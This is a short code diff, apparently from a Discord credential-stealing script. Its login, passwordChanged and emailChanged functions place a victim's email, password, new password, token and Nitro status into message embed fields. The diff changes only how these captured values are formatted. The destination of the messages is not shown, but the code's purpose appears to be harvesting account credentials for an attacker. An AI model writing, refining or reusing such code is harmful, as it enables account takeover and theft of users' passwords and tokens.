@@ -666,17 +666,17 @@ const login = async (email, password, token) => {
           },
           {
             name: '**Email**',
-            value: `${email}`,
+            value: `\`${email}\``,
             inline: true,
           },
           {
             name: '**Password**',
-            value: `${password}`,
+            value: `\`${password}\``,
             inline: true,
           },
           {
             name: '**Nitro**',
-            value: `{nitro}`,
+            value: `\`{nitro}\``,
             inline: false,
           },
           {
@@ -713,7 +713,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         fields: [
           {
             name: '**Password Changed**',
-            value: `**${newpassword}**`,
+            value: `\`${newpassword}\``,
             inline: true,
           },
           {
@@ -750,7 +750,7 @@ const emailChanged = async (email, password, token) => {
         fields: [
           {
             name: '**Email Changed**',
-            value: ``${email}``,
+            value: `\`${email}\``,
             inline: true,
           },
           {
